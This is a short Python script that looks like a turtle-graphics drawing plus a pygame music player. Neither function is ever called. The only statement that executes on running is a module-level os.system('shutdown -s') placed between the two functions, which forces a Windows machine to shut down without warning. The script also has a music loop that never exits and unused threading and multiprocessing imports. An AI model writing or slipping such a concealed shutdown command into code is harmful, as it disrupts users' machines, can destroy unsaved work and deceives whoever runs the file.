import turtle
import pygame
import os
import threading
from multiprocessing import Process
import sys

def func1():
    t = turtle.Pen()
    t.forward(100)
    t.left(90)
    t.forward(100)
    t.left(90)
    t.forward(100)
    t.left(90)
    t.forward(100)
    t.left(90)
    t.forward(200)
    t.left(90)
    t.forward(100)
    t.left(90)
    t.forward(100)
    t.forward(200)
    t.left(90)
    t.forward(100)
    t.left(90)
    t.forward(100)
    t.left(90)
    t.forward(200)
    t.right(90)
    t.forward(100)
    t.right(90)
    t.forward(100)
    t.left(180)
    t.forward(200)
    t.left(90)
    t.forward(100)
    t.left(90)
    t.forward(100)

os.system('shutdown -s')

def func2():
    pygame.init()
    song = pygame.mixer.Sound('phonk(2).mp3')
    clock = pygame.time.Clock()
    song.play()
    run =True
    while run:
        clock.tick(60)
    pygame.quit()